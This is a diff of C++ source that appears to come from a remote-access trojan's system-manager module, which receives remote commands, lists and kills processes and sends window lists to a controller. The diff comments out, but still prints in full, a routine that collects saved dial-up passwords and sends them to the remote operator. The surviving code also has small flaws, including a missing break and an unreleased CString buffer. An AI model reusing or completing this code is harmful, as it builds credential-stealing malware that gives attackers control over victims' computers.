@@ -2,7 +2,7 @@
 //
 #include "stdafx.h"
 #include "SystemManager.h"
-#include "Dialupass.h"
+//#include "Dialupass.h"
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <iphlpapi.h>
@@ -34,9 +34,9 @@ void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_WSLIST:
 		SendWindowsList();
 		break;
-	case COMMAND_DIALUPASS:
-		SendDialupassList();
-		break;
+// 	case COMMAND_DIALUPASS:
+// 		SendDialupassList();
+// 		break;
 	case COMMAND_KILLPROCESS:
 		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
 	default:
@@ -66,41 +66,41 @@ void CSystemManager::SendWindowsList()
 	LocalFree(lpBuffer);	
 }
 
-void CSystemManager::SendDialupassList()
-{
-	CDialupass	pass;
-
-	int	nPacketLen = 0;
-	int i = 0;
-	for ( i = 0; i < pass.GetMax(); i++)
-	{
-		COneInfo	*pOneInfo = pass.GetOneInfo(i);
-		for (int j = 0; j < STR_MAX; j++)
-			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
-	}
-
-	nPacketLen += 1;
-	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
-
-	DWORD	dwOffset = 1;
-
-	for (i = 0; i < pass.GetMax(); i++)
-	{
-
-		COneInfo	*pOneInfo = pass.GetOneInfo(i);
-		for (int j = 0; j < STR_MAX; j++)
-		{
-			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
-			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
-			dwOffset += nFieldLength;
-		}
-	}
-
-	lpBuffer[0] = TOKEN_DIALUPASS;
-	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
-	LocalFree(lpBuffer);
-
-}
+// void CSystemManager::SendDialupassList()
+// {
+// 	CDialupass	pass;
+// 
+// 	int	nPacketLen = 0;
+// 	int i = 0;
+// 	for ( i = 0; i < pass.GetMax(); i++)
+// 	{
+// 		COneInfo	*pOneInfo = pass.GetOneInfo(i);
+// 		for (int j = 0; j < STR_MAX; j++)
+// 			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
+// 	}
+// 
+// 	nPacketLen += 1;
+// 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
+// 
+// 	DWORD	dwOffset = 1;
+// 
+// 	for (i = 0; i < pass.GetMax(); i++)
+// 	{
+// 
+// 		COneInfo	*pOneInfo = pass.GetOneInfo(i);
+// 		for (int j = 0; j < STR_MAX; j++)
+// 		{
+// 			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
+// 			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
+// 			dwOffset += nFieldLength;
+// 		}
+// 	}
+// 
+// 	lpBuffer[0] = TOKEN_DIALUPASS;
+// 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
+// 	LocalFree(lpBuffer);
+// 
+// }
 void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
 {
 	HANDLE hProcess = NULL;
@@ -127,7 +127,8 @@ LPBYTE CSystemManager::getProcessList()
 	HMODULE			hModules = NULL;
 	PROCESSENTRY32	pe32 = {0};
 	DWORD			cbNeeded;
-	char			strProcessName[MAX_PATH] = {0};
+	//char			strProcessName[MAX_PATH] = {0};
+	CString         strProcessName;
 	LPBYTE			lpBuffer = NULL;
 	DWORD			dwOffset = 0;
 	DWORD			dwLength = 0;
@@ -153,7 +154,7 @@ LPBYTE CSystemManager::getProcessList()
 			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
 			{
 				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
-				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
+				GetModuleFileNameEx(hProcess, hModules, strProcessName.GetBuffer(), MAX_PATH);
 
 				// 此进程占用数据大小
 				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
